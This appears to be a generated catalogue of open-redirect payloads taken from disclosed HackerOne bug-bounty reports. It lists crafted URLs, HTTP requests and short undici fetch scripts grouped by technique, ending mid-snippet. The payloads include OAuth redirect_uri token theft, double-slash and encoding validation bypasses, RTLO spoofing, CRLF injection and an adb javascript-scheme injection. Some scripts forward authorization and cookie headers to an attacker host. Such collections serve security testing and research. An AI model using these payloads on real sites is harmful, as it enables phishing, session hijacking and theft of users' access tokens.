# Open Redirect

139 payloads from disclosed reports.

## Open redirect by supplying a malicious URL in the 'url' query parameter

### `2279737e`

```
https://target.com/en//example.com/
```

— [Reflected XSS via Unvalidated / Open Redirect in target.com](https://hackerone.com/reports/125791) · Uber · [mdv](https://hackerone.com/mdv) · $3,000.0

### `0422387e`

```
https://target.com/login?next=https://evil.com.
```

**Parameter:** `next`
— [XSS and Open Redirect on MoPub Login](https://hackerone.com/reports/683298) · X / xAI · [jackb898](https://hackerone.com/jackb898) · $1,540.0

### `246736de`

```
https://target.com/dialog/oauth?client_id=184510521580034&response_type=token&redirect_uri=https://evil.com/phame/live/47/
```

**Parameter:** `redirect_uri`
— [OAuth access_token stealing in Phabricator](https://hackerone.com/reports/3596) · Phabricator · [krangbuster](https://hackerone.com/krangbuster) · $450.0

### `62cbe671`

```
https://target.com///evil.com/?target.com/?category=interview&page=2
```

**Parameter:** `url`
— [Open Redirect](https://hackerone.com/reports/1213580) · Affirm · [0xpugal](https://hackerone.com/0xpugal) · $250.0

### `638a976e`

```
https://target.com/dialog/oauth?client_id=19884028963&redirect_uri=https://evil.com/_facebook/join?ssl=0&iframe=0&popup=0&player=0&product_id=0&scope=email,basic_info,read_stream,publish_actions&state=
```

**Parameter:** `redirect_uri`
— [unvalid open authentication with facebook](https://hackerone.com/reports/44425) · Vimeo · [ckmk44](https://hackerone.com/ckmk44)

### `f112958f`

```
http://attacker.com/chromeFileUploadCrossDomain.swf?url=redirect.php?input=https://target.com/u/0/
```

**Parameter:** `url`
— [Flash Cross Domain Policy Bypass by Using File Upload and Redirection - only in Chrome](https://hackerone.com/reports/51265) · Internet Bug Bounty · [irsdl](https://hackerone.com/irsdl)

### `d351e96f`

```
http://attacker.com/chromeFileUploadCrossDomain.swf?url=http://target.com/demo/openredirect/redirect.php?target=https://evil.com/u/0/%26status=301
```

**Parameter:** `url`
— [Flash Cross Domain Policy Bypass by Using File Upload and Redirection - only in Chrome](https://hackerone.com/reports/51265) · Internet Bug Bounty · [irsdl](https://hackerone.com/irsdl)

### `f0072291`

```
http://HOST/PATH_TO_EE/index.php?URL=https://target.com
```

**Parameter:** `URL`
— [Open redirects protection bypass](https://hackerone.com/reports/236599) · ExpressionEngine · [strukt](https://hackerone.com/strukt)

### `fc70bb47`

```
https://target.com/#/path///evil.com
```

— [Open redirect](https://hackerone.com/reports/753399) · Nord Security · [nickelheck](https://hackerone.com/nickelheck)

### `3ad0324e`

```
{
    "url": "https:\/\/target.com\/api\/accounts\/F8gHiqSdpK\/..\/..\/..\/redirect?url=https:\/\/evil.com\/uploads\/#\/\/statements?month=03&year=2020",
    "data": "<html>\n<head><title>Index of \/uploads\/<\/title><\/head>\n<body bgcolor=\"white\">\n<h1>Index of \/uploads\/<\/h1><hr><pre><a href=\"..\/\">..\/<\/a>\n<a href=\"\/uploads\/BountyPay.apk\">BountyPay.apk<\/a>                                        20-Apr-2020 11:26              4043701\n<\/pre><hr><
```

**Parameter:** `url`
— [\[H1-2006 2020\] \[CTF Writeup\] A story about Bounty Payments, Collaboration & Community](https://hackerone.com/reports/892337) · h1-ctf · [sturedman](https://hackerone.com/sturedman)

### `ac4e3123`

```
https://██████████.evil.com/████?url=http://target.com/
```

**Parameter:** `url`
— [Open Redirect - https://████████.target.com/███?url=](https://hackerone.com/reports/1851969) · JetBlue · [theendisnear](https://hackerone.com/theendisnear)


## Open redirect via the "url" query parameter

### `c5febaa3`

```
GET /redirect.php?url=http://evil.com HTTP/1.1
Host: example.com
```

**Parameter:** `url`
— [Leak of Platform Authentication credentials via Repeater](https://hackerone.com/reports/302651) · PortSwigger Web Security · [jupenur](https://hackerone.com/jupenur) · $200.0

### `e2865b7b`

```
http://target.com/link?url=http%3A%2F%2Fevil.com
```

**Parameter:** `url`
— [Open Redirect in Slack](https://hackerone.com/reports/4549) · Slack · [prakharprasad](https://hackerone.com/prakharprasad)

### `2dc67c93`

```
https://target.com/redirect?url=http://evil.com
```

**Parameter:** `url`
— [Open Redirect](https://hackerone.com/reports/311330) · Semrush · [ankit_singh](https://hackerone.com/ankit_singh)

### `cf8edaee`

```
https://target.com/redirect?url=...
```

**Parameter:** `url`
— [@shakedko H1-2006 CTF writeup](https://hackerone.com/reports/894623) · h1-ctf · [shakedko](https://hackerone.com/shakedko)

### `42ddbd04`

```
https://target.com/redirect?url=https://evil.com?q=REST+API
```

**Parameter:** `url`
— [\[h1-2006 2020\]  Chained vulnerabilities lead to account takeover](https://hackerone.com/reports/895650) · h1-ctf · [kanytu](https://hackerone.com/kanytu)

### `81f2b638`

```
https://target.com/redirect?url=https://evil.com/search?q=REST+API.
```

**Parameter:** `url`
— [\[h1-2006 2020\] Write up for H1-2006 CTF](https://hackerone.com/reports/895772) · h1-ctf · [zer0ttl](https://hackerone.com/zer0ttl)

### `a3616d96`

```
http://target.com/redirect?url=https://evil.com
```

**Parameter:** `url`
— [Open Redirect on http://target.com/redirect?url=https://evil.com](https://hackerone.com/reports/1028345) · HackerOne · [nagli](https://hackerone.com/nagli)


## Open redirect via path manipulation using a double‑slash scheme

### `f70de4ea`

```
https://target.com//example.com/ru/faq
```

— [Open redirect in "Language change".](https://hackerone.com/reports/52035) · HackerOne · [seifelsallamy](https://hackerone.com/seifelsallamy) · $500.0

### `efd9cf42`

```
https://target.com//example.com/faq
```

— [Open redirect in "Language change".](https://hackerone.com/reports/52035) · HackerOne · [seifelsallamy](https://hackerone.com/seifelsallamy) · $500.0

### `03b9b28f`

```
https://target.com//example.com/disclosure-guidelines
```

— [Open redirect in "Language change".](https://hackerone.com/reports/52035) · HackerOne · [seifelsallamy](https://hackerone.com/seifelsallamy) · $500.0

### `1154b1cc`

```
https://target.com//example.com/ru/disclosure-guidelines
```

— [Open redirect in "Language change".](https://hackerone.com/reports/52035) · HackerOne · [seifelsallamy](https://hackerone.com/seifelsallamy) · $500.0

### `fab60aad`

```
http://target.com//example.com/
```

— [\[target.com\] Open Redirect](https://hackerone.com/reports/297803) · Unikrn · [root0x0](https://hackerone.com/root0x0)

### `3996f885`

```
https://target.com//example.com/
```

— [\[target.com\] Open Redirect](https://hackerone.com/reports/297803) · Unikrn · [root0x0](https://hackerone.com/root0x0)


## Open redirect using a double‑slash URL to bypass validation

### `6a001860`

```
https://target.com//target.com
```

— [Open-redirect on target.com](https://hackerone.com/reports/57163) · HackerOne · [abze](https://hackerone.com/abze)

### `b42690e1`

```
https://target.com//evil.com
```

— [Open-redirect on target.com](https://hackerone.com/reports/57163) · HackerOne · [abze](https://hackerone.com/abze)

### `79f59f82`

```
https://target.com//example.com/%2F..
```

— [Open redirect found on target.com](https://hackerone.com/reports/1338437) · Brave Software · [tabaahi](https://hackerone.com/tabaahi)

### `27130058`

```
http://localhost:3000//target.com/%2e%2e
```

— [Open redirect in fastify-static via mishandled user's input when attempt to redirect](https://hackerone.com/reports/1354255) · Fastify · [drstrnegth](https://hackerone.com/drstrnegth)

### `c2e7f826`

```
http://localhost:3000//a//target.com/%2e%2e%2f%2e%2e
```

— [1-click DOS in fastify-static via directly passing user's input to new URL() of NodeJS without try/catch](https://hackerone.com/reports/1361804) · Fastify · [drstrnegth](https://hackerone.com/drstrnegth)


## Open redirect via the 'next' parameter using a triple‑slash prefix

### `801a80dd`

```
https://target.com/login?next=https://evil.com
```

**Parameter:** `next`
— [XSS and Open Redirect on MoPub Login](https://hackerone.com/reports/683298) · X / xAI · [jackb898](https://hackerone.com/jackb898) · $1,540.0

### `0656b5c1`

```
https://target.com/accounts/login/github/?next=///evil.com
```

**Parameter:** `next`
— [Open Redirect via "next" parameter in third-party authentication](https://hackerone.com/reports/223326) · Weblate · [ysx](https://hackerone.com/ysx)

### `e70e7e61`

```
https://target.com/accounts/login/facebook/?next=///evil.com
```

**Parameter:** `next`
— [Open redirect in Signing in via Social Sites](https://hackerone.com/reports/223718) · Weblate · [rajauzairabdullah](https://hackerone.com/rajauzairabdullah)

### `6b285bed`

```
https://target.com/accounts/login/bitbucket/?next=///evil.com
```

**Parameter:** `next`
— [Open redirect in Signing in via Social Sites](https://hackerone.com/reports/223718) · Weblate · [rajauzairabdullah](https://hackerone.com/rajauzairabdullah)

### `65f995b3`

```
https://target.com/accounts/login/gitlab/?next=///evil.com
```

**Parameter:** `next`
— [Open redirect in Signing in via Social Sites](https://hackerone.com/reports/223718) · Weblate · [rajauzairabdullah](https://hackerone.com/rajauzairabdullah)


## Open redirect using protocol‑relative URL

### `180ccc5e`

```
https://target.com//evil.com/%2F..
```

— [Open Redirect in target.com](https://hackerone.com/reports/125000) · Uber · [bobrov](https://hackerone.com/bobrov) · $500.0

### `fe246a0d`

```
target.com                         //target.com
```

— [Open Redirect Protection Bypass](https://hackerone.com/reports/283460) · X / xAI · [avinash_](https://hackerone.com/avinash_) · $280.0

### `18b343d3`

```
https://target.com//evil.com?q=ohdear&a
```

— [\[target.com\] Open Redirect](https://hackerone.com/reports/123625) · Informatica · [albinowax](https://hackerone.com/albinowax)

### `baaaaf30`

```
GET //target.com/%2e%2e HTTP/1.1
Host: localhost:3000
Accept-Encoding: gzip, deflate
Connection: close
```

— [Open redirect in fastify-static via mishandled user's input when attempt to redirect](https://hackerone.com/reports/1354255) · Fastify · [drstrnegth](https://hackerone.com/drstrnegth)

### `f4bc9765`

```
//target.com
```

**Parameter:** `redirect`
— [Bypass of Open Redirect Fix on lovable.dev via /..// Path Traversal in redirect parameter](https://hackerone.com/reports/3599248) · Lovable VDP · [marioniangi](https://hackerone.com/marioniangi)


## Open redirect via unvalidated 'continue' URL parameter

### `5cbc58ff`

```
https://target.com/login?continue=http://evil.com
```

**Parameter:** `continue`
— [https://target.com/login open-redirect](https://hackerone.com/reports/6357) · Khan Academy · [smiegles](https://hackerone.com/smiegles)

### `eaeb7748`

```
https://target.com/login?continue=http:/evil.com
```

**Parameter:** `continue`
— [https://target.com/login open-redirect](https://hackerone.com/reports/6357) · Khan Academy · [smiegles](https://hackerone.com/smiegles)

### `cc7de216`

```
http://<instance>/<user>/<repository>/import?continue[to]=//target.com
```

**Parameter:** `continue[to]`
— [\[Repository Import\] Open Redirect via "continue\[to\]" parameter ](https://hackerone.com/reports/215970) · GitLab · [ysx](https://hackerone.com/ysx)

### `02e1592c`

```
https://target.com/auth/fb?continue=https://evil.com
```

**Parameter:** `continue`
— [Open redirect on https://target.com](https://hackerone.com/reports/771699) · Clario · [jin0ne](https://hackerone.com/jin0ne)


## Open redirect via unvalidated "redirect" query parameter pointing to an attacker‑controlled URL

### `1107b431`

```
https://target.com/?nonce=wI0UglN84A06Q4z4JnkZVc3i1V8%3D&redirect_uri=https%3A%2F%2Fevil2.com%23%40secure.evil.com%2Flogin%2Fpiv_cac
```

**Parameter:** `redirect_uri`
— [open redirect in target.com](https://hackerone.com/reports/798742) · GSA Bounty · [timwhite](https://hackerone.com/timwhite) · $150.0

### `9e49b603`

```
https://target.com/studio/forbidden/?message=Hi%20You%20Are%20%20Not%20%20in%20Mapbox%20Please%20Go%20%20To%20http://evil.com&redirect=/evil.com/&path=%2Fstudio%2Fadmin%2F
```

**Parameter:** `redirect`
— [Content Spoofing and Local Redirect in Mapbox Studio](https://hackerone.com/reports/114529) · Mapbox · [hussain_0x3c](https://hackerone.com/hussain_0x3c)

### `6c10f64e`

```
https://target.com/wp-login.php?redirect_to=https%3A%2F%2Fevil.com%2Fsearch?q=myFakeSite&reauth=1
```

**Parameter:** `redirect_to`
— [CPU utilization 99% on visiting wordpress site url & open redirect found](https://hackerone.com/reports/129091) · Automattic · [csanuragjain](https://hackerone.com/csanuragjain)

### `5d382894`

```
https://target.com/login/login.do?redirect_url=//evil.com
```

**Parameter:** `redirect_url`
— [Open Redirection in Login - Korean Starbucks](https://hackerone.com/reports/380939) · Starbucks · [jtjisgod](https://hackerone.com/jtjisgod)


## Open redirect via the 'url' parameter in a Slack link endpoint

### `05c9c366`

```
https://target.com/l.php?u=https://evil.com/
```

**Parameter:** `u`
— [Browser is not following proper flow for redirection cause open redirect ](https://hackerone.com/reports/1579374) · Brave Software · [kalkii](https://hackerone.com/kalkii) · $500.0

### `3a037786`

```
https://target.com/link?url=http://evil.com
```

**Parameter:** `url`
— [open redirect in https://target.com](https://hackerone.com/reports/6035) · Slack · [ipk1](https://hackerone.com/ipk1)

### `ca08ddda`

```
https://target.com/redirect?url=https://evil.com/search?q=REST+API
```

**Parameter:** `url`
— [\[H1-2006 2020\] \[CTF Writeup\] A story about Bounty Payments, Collaboration & Community](https://hackerone.com/reports/892337) · h1-ctf · [sturedman](https://hackerone.com/sturedman)

### `9b96f20b`

```
https://target.com/redirect.php?url=http://evil.com.
```

**Parameter:** `url`
— [Vulnerability Name: URL Redirection / Unvalidate Open Redirect](https://hackerone.com/reports/1182824) · Reddit · [hasnain_123](https://hackerone.com/hasnain_123)


## Open redirect via directory‑traversal in the account_id JSON field to inject an arbitrary URL

### `9ae0b81f`

```
<@base64_2>{"account_id":"../../redirect?url=https://target.com/search?q=REST+API#","hash":0}<@/base64_2>
```

**Parameter:** `account_id`
— [\[H1-2006 2020\] Writeup](https://hackerone.com/reports/894170) · h1-ctf · [njbooher3](https://hackerone.com/njbooher3)

### `b9de9e0a`

```
<@base64_2>{"account_id":"../../redirect?url=https://target.com/#","hash":0}<@/base64_2>
```

**Parameter:** `account_id`
— [\[H1-2006 2020\] Writeup](https://hackerone.com/reports/894170) · h1-ctf · [njbooher3](https://hackerone.com/njbooher3)

### `539a82b3`

```
<@base64_2>{"account_id":"../../redirect?url=https://target.com/uploads/BountyPay.apk#","hash":0}<@/base64_2>
```

**Parameter:** `account_id`
— [\[H1-2006 2020\] Writeup](https://hackerone.com/reports/894170) · h1-ctf · [njbooher3](https://hackerone.com/njbooher3)


## Open redirect by providing a crafted URL in the redirect query parameter

### `2b8d97c5`

```
https://target.com/auth/post-login?redirect=%2F%3Fshould-refresh-credentials%3D1&_rsc=1b5jt
```

**Parameter:** `redirect`
— [Open Redirect on lovable.dev via redirect parameter leads to phishing attacks](https://hackerone.com/reports/3581815) · Lovable VDP · [jdc94](https://hackerone.com/jdc94)

### `14afb948`

```
https://target.com/auth/post-login?redirect=/\evil.com
```

**Parameter:** `redirect`
— [Open Redirect on lovable.dev via redirect parameter leads to phishing attacks](https://hackerone.com/reports/3581815) · Lovable VDP · [jdc94](https://hackerone.com/jdc94)

### `170cb6a1`

```
https://target.com/purchase-success?redirect=/%5Cevil.com.
```

**Parameter:** `redirect`
— [Open Redirect on lovable.dev via redirect parameter leads to phishing attacks](https://hackerone.com/reports/3581815) · Lovable VDP · [jdc94](https://hackerone.com/jdc94)


## Open redirect by supplying a crafted URL with //target.com/%2f..

### `9df0feaa`

```
http://target.com//evil.com/%2f..
```

— [Open Redirection Found in users.whisper.sh](https://hackerone.com/reports/261592) · Whisper · [hackedbrain](https://hackerone.com/hackedbrain)

### `161e88b3`

```
https://target.com/rossiya#login?next=///<open-redirect-url
```

**Parameter:** `next`
— [Open Redirect via login target.com | Protection bypass](https://hackerone.com/reports/355558) · Avito · [w2w](https://hackerone.com/w2w)

### `9bed72ef`

```
/www/admin/campaign-modify.php?clientid=&campaignid=&returnurl=%2F%2F%2F%2Ftarget.com
```

**Parameter:** `returnurl`
— [Open redirection bypass in /www/admin/campaign-modify.php](https://hackerone.com/reports/794144) · Revive Adserver · [hoangn14](https://hackerone.com/hoangn14)


## Open redirect by supplying an external URL in the 'r' query parameter

### `ceb29c7c`

```
https://target.com/global/identity?r=https://evil.com
https://target.com/global/identity?r=https://evil2.com/
https://target.com/global/identity?r=https://evil3.com/merch
https://target.com/global/identity?r=https://evil3.com
https://target.com/global/identity?r=https://evil3.com
https://target.com/global/identity?r=https://evil3.com
https://target.com/global/identity?r=https://evil3.com
https://target.com/global/identity?r=http
```

**Parameter:** `r`
— [Steal any users `access_token` via open redirect in https://target.com/global/identity?popup=1&r=](https://hackerone.com/reports/1327742) · Logitech · [sudi](https://hackerone.com/sudi)

### `d12ac921`

```
https://target.com/global/identity?r=https://evil.com/
```

**Parameter:** `r`
— [Steal any users `access_token` via open redirect in https://target.com/global/identity?popup=1&r=](https://hackerone.com/reports/1327742) · Logitech · [sudi](https://hackerone.com/sudi)

### `4140354b`

```
https://target.com/global/identity?popup=1&r=http://evil.com
```

**Parameter:** `r`
— [Steal any users `access_token` via open redirect in https://target.com/global/identity?popup=1&r=](https://hackerone.com/reports/1327742) · Logitech · [sudi](https://hackerone.com/sudi)


## Open redirect using URL with embedded credentials (https@google.com)

### `1ef245f7`

```
https://target.com@%E2%80%AE@moc.rettiwt
```

— [Domain spoofing in redirect page using RTLO](https://hackerone.com/reports/299403) · HackerOne · [ashish_r_padelkar](https://hackerone.com/ashish_r_padelkar)

### `f6aa3f19`

```
https://█████_https@google.com
```

— [Open Redirection](https://hackerone.com/reports/1267176) · JetBlue · [0xjackal](https://hackerone.com/0xjackal)

### `2f4a4b37`

```
https://████_https@google.com
```

— [Open Redirection](https://hackerone.com/reports/1267176) · JetBlue · [0xjackal](https://hackerone.com/0xjackal)


## Open redirect using a crafted URL with double slash to redirect to an external domain

### `866c3273`

```
https://target.com//evil.com/cities
```

— [Open Redirection on target.com](https://hackerone.com/reports/119236) · Uber · [rohk](https://hackerone.com/rohk) · $500.0

### `f297cae7`

```
https://target.com//evil.com/..;/css
```

— [\[target.com\] Open Redirect](https://hackerone.com/reports/387007) · GSA Bounty · [bobrov](https://hackerone.com/bobrov) · $150.0


## Open‑redirect with path‑traversal to access the `/uploads` directory via the `url` parameter

### `37f647fb`

```
{"url":"https:\/\/target.com\/api\/accounts\/..\/..\/redirect?url=https:\/\/evil.com\/uploads?\/statements?month=01&year=2020","data":"<html>\n<head><title>Index of \/uploads\/<\/title><\/head>\n<body bgcolor=\"white\">\n<h1>Index of \/uploads\/<\/h1><hr><pre><a href=\"..\/\">..\/<\/a>\n<a href=\"\/uploads\/BountyPay.apk\">BountyPay.apk<\/a>                                        20-Apr-2020 11:26              4043701\n<\/pre><hr><\/body>\n<\/html>\n"}
```

**Parameter:** `url`
— [\[h1-2006 2020\]  Chained vulnerabilities lead to account takeover](https://hackerone.com/reports/895650) · h1-ctf · [kanytu](https://hackerone.com/kanytu)

### `6a50ab6f`

```
/..//target.com
```

**Parameter:** `redirect`
— [Bypass of Open Redirect Fix on lovable.dev via /..// Path Traversal in redirect parameter](https://hackerone.com/reports/3599248) · Lovable VDP · [marioniangi](https://hackerone.com/marioniangi)


## Open redirect using percent-encoded non-ASCII (%ff) in userinfo of callback_url to bypass validation

### `3fae1ab4`

```
https://attacker.com%ff@www.target.com
```

**Parameter:** `callback_url`
— [Bypassing callback_url validation on Digits](https://hackerone.com/reports/108113) · X / xAI · [filedescriptor](https://hackerone.com/filedescriptor)

### `24e22f72`

```
https://target.com/login?consumer_key=9I4iINIyd0R01qEPEwT9IC6RE&host=https%3A%2F%2Fevil3.com&callback_url=https://evil.com%FF@www.evil3.com
```

**Parameter:** `callback_url`
— [Bypassing callback_url validation on Digits](https://hackerone.com/reports/108113) · X / xAI · [filedescriptor](https://hackerone.com/filedescriptor)


## Open redirect using the 'r' parameter to supply an arbitrary protocol URL

### `de123ac1`

```
target.com/global/identity?popup=1&r=protocol://evil.com
```

**Parameter:** `r`
— [session takeover via open protocol redirection on target.com](https://hackerone.com/reports/1178239) · Logitech · [f_m](https://hackerone.com/f_m) · $200.0

### `f400bcaf`

```
1. once authenticated on target.com go to: target.com/global/identity?popup=1&r=test://evil.com and intercept the request in burp.
```

**Parameter:** `r`
— [session takeover via open protocol redirection on target.com](https://hackerone.com/reports/1178239) · Logitech · [f_m](https://hackerone.com/f_m) · $200.0


## Open redirect using the 'redir' query parameter to forward to an arbitrary URL

### `171f7bb7`

```
https://target.com/?redir=llink?url=https://evil.com/
```

**Parameter:** `redir`
— [Open Redirect login account](https://hackerone.com/reports/16718) · Slack · [jaysonzabate](https://hackerone.com/jaysonzabate) · $100.0

### `525ef230`

```
www.[TEAM].evil.com/?redir=llink?url=https://target.com/
```

**Parameter:** `redir`
— [Open Redirect login account](https://hackerone.com/reports/16718) · Slack · [jaysonzabate](https://hackerone.com/jaysonzabate) · $100.0


## Open redirect via the "redirect_after_login" parameter with an encoded URL

### `e4a54514`

```
https%3A%2F%2Fevil.com%2Fdaa%2F0%2Fdaa_optout_actions%3Faction_id%3D4%26rd%3Dhttps%253A%252F%252Fddosecrets%2525E3%252580%252582com%253F
```

**Parameter:** `redirect_after_login`
— [Chained open redirects and use of Ideographic Full Stop defeat Twitter's  approach to blocking links](https://hackerone.com/reports/1032610) · X / xAI · [jub0bs](https://hackerone.com/jub0bs) · $560.0

### `bce9b461`

```
https://target.com/login?redirect_after_login=https%3A%2F%2Fevil.com%2Fdaa%2F0%2Fdaa_optout_actions%3Faction_id%3D4%26rd%3Dhttps%253A%252F%252Fddosecrets%2525E3%252580%252582com%253F
```

**Parameter:** `redirect_after_login`
— [Chained open redirects and use of Ideographic Full Stop defeat Twitter's  approach to blocking links](https://hackerone.com/reports/1032610) · X / xAI · [jub0bs](https://hackerone.com/jub0bs) · $560.0


## Open redirect using redirect parameter with protocol‑relative URL

### `acfc705e`

```
https://target.com/login?redirect=//acme
```

**Parameter:** `redirect`
— [target.com domain takeover](https://hackerone.com/reports/320355) · Shopify · [0xacb](https://hackerone.com/0xacb)

### `f1e24823`

```
https://target.com/auth/post-login?redirect=/..//evil.com
```

**Parameter:** `redirect`
— [Bypass of Open Redirect Fix on lovable.dev via /..// Path Traversal in redirect parameter](https://hackerone.com/reports/3599248) · Lovable VDP · [marioniangi](https://hackerone.com/marioniangi)


## Open‑redirect via unsafe_link parameter containing a malicious URL

### `3fa05ed6`

```
https://target.com/safety/unsafe_link_warning?unsafe_link=https%3A%2F%2F%E2%80%AEevil2.com
```

**Parameter:** `unsafe_link`
— [Wrong Interpretation of URL encoded characters, showing different punny code leads to redirection on different domain](https://hackerone.com/reports/635597) · X / xAI · [mr_edwards](https://hackerone.com/mr_edwards) · $560.0

### `d67b0c62`

```
https://target.com/safety/unsafe_link_warning?unsafe_link=https%3A%2F%2F%E2%80%AEmoc.rettiwt
```

**Parameter:** `unsafe_link`
— [Wrong Interpretation of URL encoded characters, showing different punny code leads to redirection on different domain](https://hackerone.com/reports/635597) · X / xAI · [mr_edwards](https://hackerone.com/mr_edwards) · $560.0


## Open redirect via unvalidated 'url' query parameter

### `5b973b6b`

```
import { fetch } from 'undici'

const res = await fetch('http://target.com/redirect.php?url=http://attacker.com:8182/vvv',{
        maxRedirections: 3,
        headers: {
            AutHorization: 'test',
            Cookie: "ddd=dddd"
        }})
const json = await res.json()
console.log(json)
```

**Parameter:** `url`
— [Cookie headers are not cleared in cross-domain redirect in undici-fetch](https://hackerone.com/reports/2243710) · Internet Bug Bounty · [ranjit_p](https://hackerone.com/ranjit_p) · $405.0

### `97c7ac0d`

```
http://target.com/?url=evil.com
```

**Parameter:** `url`
— [Url Redirection](https://hackerone.com/reports/13553) · Factlink · [robin](https://hackerone.com/robin)


## Open‑redirect via vulnerable redirectUrl parameter

### `f8e9a14d`

```
https://target.com/login?redirectUrl=https://evil.com///loving-turing-29a494.netlify.app%2523&callbackUrl=https://evil.com///loving-turing-29a494.netlify.app%2523
```

**Parameter:** `redirectUrl`
— [\[cs.money\] Open Redirect Leads to Account Takeover](https://hackerone.com/reports/905607) · CS Money · [abdilahrf_](https://hackerone.com/abdilahrf_)

### `cd4c5395`

```
https://target.com/#?token=Dlk9sGd8zc6OvxlITijQR&redirectUrl=https://evil.com///loving-turing-29a494.netlify.app#
```

**Parameter:** `redirectUrl`
— [\[cs.money\] Open Redirect Leads to Account Takeover](https://hackerone.com/reports/905607) · CS Money · [abdilahrf_](https://hackerone.com/abdilahrf_)


## JavaScript scheme injection via Android intent data URI

### `bf4bdd70`

```
3. To reproduce javascript injection: adb shell am start -n com.twitter.android.lite/com.twitter.android.lite.TwitterLiteActivity -d "javascript://example.com%0A alert(1);"
```

— [Twitter lite(Android): Vulnerable to local file steal, Javascript injection, Open redirect ](https://hackerone.com/reports/499348) · X / xAI · [rahulkankrale](https://hackerone.com/rahulkankrale)


## Open‑redirect by abusing triple‑slash path manipulation

### `4cd34a0b`

```
https://target.com///evil.com
```

— [\[cs.money\] Open Redirect Leads to Account Takeover](https://hackerone.com/reports/905607) · CS Money · [abdilahrf_](https://hackerone.com/abdilahrf_)


## Open redirect by appending an external domain after a double slash in the path

### `f8088fc8`

```
https://target.com//evil.com/
```

— [Open-redirect on target.com](https://hackerone.com/reports/113112) · Paragon Initiative Enterprises · [hat_mast3r](https://hackerone.com/hat_mast3r)


## Open redirect with arbitrary protocol handler (e.g., vnc://) via the url parameter

### `1b81c9d9`

```
https://target.com/redirect?url=ftp://evil.com:1337**
```

**Parameter:** `url`
— [protocol & Ports are not shown in third-party site redirect warning page ](https://hackerone.com/reports/459286) · Semrush · [0xprial](https://hackerone.com/0xprial)


## Open redirect attempt to an external domain via the `url` parameter

### `73274637`

```
https://target.com/redirect?url=https://evil.com
```

**Parameter:** `url`
— [\[H1-2006 2020\] CTF writeup](https://hackerone.com/reports/892632) · h1-ctf · [0xbeefed](https://hackerone.com/0xbeefed)


## Open redirect via the 'authorize_callback' parameter with a protocol‑relative URL

### `e29139a1`

```
https://target.com/teams/authorize?target_screen_name=&authorize_callback=//evil.com
```

**Parameter:** `authorize_callback`
— [Open Redirect Protection Bypass](https://hackerone.com/reports/283460) · X / xAI · [avinash_](https://hackerone.com/avinash_) · $280.0


## Open redirect with base64‑encoded 'url' parameter

### `254f007e`

```
https://target.com/admin/report?url=Lz90ZW1wbGF0ZT1ob21l
```

**Parameter:** `url`
— [\[H1-2006 2020\] Writeup](https://hackerone.com/reports/894170) · h1-ctf · [njbooher3](https://hackerone.com/njbooher3)


## Open redirect bypass using Unicode fullwidth dot in url parameter

### `f63ebf80`

```
https://target.com/linkfilter/?url=pornhub%E3%80%82com
```

**Parameter:** `url`
— [Link filter protection bypass](https://hackerone.com/reports/291750) · Valve · [ramsexy](https://hackerone.com/ramsexy)


## Open redirect chain: malicious redirect_uri in Facebook OAuth that points to Phabricator OAuth which then forwards to attacker

### `c42073e7`

```
https://target.com/dialog/oauth?client_id=184510521580034&response_type=token&redirect_uri=https://evil.com/oauthserver/auth/?redirect_uri=http://evil2.com%26response_type=code%26client_id=PHID-OASC-oyfqtnanxsukiw5lsnce%26scope=ggg
```

**Parameter:** `redirect_uri`
— [OAuth Stealing Attack (New)](https://hackerone.com/reports/3930) · Phabricator · [krangbuster](https://hackerone.com/krangbuster) · $400.0


## Open redirect chain using the URL query parameter

### `4a0e831a`

```
https://example.com/?URL=https://example.com/?URL=http://evil.com
```

**Parameter:** `URL`
— [\[EE\] Spoof the redirect process](https://hackerone.com/reports/339987) · ExpressionEngine · [flex0geek](https://hackerone.com/flex0geek)


## Open redirect via 'continue' parameter in GET request

### `0767ae93`

```
GET /transfer_auth?key=<TOKEN?>&continue=/ HTTP/1.1
Host: xfarr-6fmjyrz2lq-uc-a-run.app
```

**Parameter:** `continue`
— [1-Click Account Takeover via Open Redirect through Regex Bypass in Domain Validation](https://hackerone.com/reports/3723458) · Khan Academy · [farr](https://hackerone.com/farr)


## Open redirect via 'continue' URL parameter

### `cac2a421`

```
https://target.com/login?continue=https%3A%2F%2Fevil.com%2F
```

**Parameter:** `continue`
— [1-Click Account Takeover via Open Redirect through Regex Bypass in Domain Validation](https://hackerone.com/reports/3723458) · Khan Academy · [farr](https://hackerone.com/farr)


## Open redirect by controlling the "redirect_to" URL parameter

### `b61c000f`

```
https://target.com/wordpress/wp-login.php?redirect_to=https%3A%2F%2Ftarget.com%2Fwordpress%2Fwp-admin%2F&reauth=1
```

**Parameter:** `redirect_to`
— [Potential Open-Redirection](https://hackerone.com/reports/765227) · Ian Dunn · [damn007](https://hackerone.com/damn007)


## Open redirect via crafted redirect_uri parameter

### `95a2171c`

```
https://target.com/oauth/authorize?client_id=███&response_type=token&redirect_uri=https%3A%2F%2Fevil.com%2Fauth%2Fcallback&state=███
```

**Parameter:** `redirect_uri`
— [Stealing Users OAuth Tokens through redirect_uri parameter](https://hackerone.com/reports/665651) · GSA Bounty · [manshum12](https://hackerone.com/manshum12) · $750.0


## Open‑redirect by crafting a `url` value with path‑traversal to the `/redirect` endpoint

### `c5aaba21`

```
{
   "url":"https:\/\/target.com\/api\/accounts\/..\/..\/redirect?url=https:\/\/evil.com\/\/statements?month=01&year=2020",
   "data":"<html>\n<head><title>404 Not Found<\/title><\/head>\n<body>\n<center><h1>404 Not Found<\/h1><\/center>\n<hr><center>nginx\/1.15.8<\/center>\n<\/body>\n<\/html>"
}
```

**Parameter:** `url`
— [\[h1-2006 2020\]  Chained vulnerabilities lead to account takeover](https://hackerone.com/reports/895650) · h1-ctf · [kanytu](https://hackerone.com/kanytu)


## Open redirect using CRLF injection in the redirect_uri parameter

### `4eae413b`

```
https://target.com/oauth/authorize?client_id=&redirect_uri=%0d%0axxx:something&response_type=code
```

**Parameter:** `redirect_uri`
— [Security bug https://target.com/oauth/authorize - CRLF Header injection via "redirect_uri" parameter](https://hackerone.com/reports/2147132) · Mozilla · [oja](https://hackerone.com/oja) · $200.0


## Open redirect using escaped backslash before @ in callback_url to bypass validation

### `6c0a8863`

```
https://whatever\@www.target.com
```

**Parameter:** `callback_url`
— [Bypassing callback_url validation on Digits](https://hackerone.com/reports/108113) · X / xAI · [filedescriptor](https://hackerone.com/filedescriptor)


## Open redirect exploitation by supplying a malicious URL in the "url" query parameter

### `afa2f654`

```
import { request } from 'undici'
const {
  statusCode,
  headers,
  trailers,
  body
} = await request('http://target.com/redirect.php?url=http://attacker:8182',{
        maxRedirections: 3,
        headers: {
            autHorization: 'test',
	    cookie: "ddd=dddd"
        }})

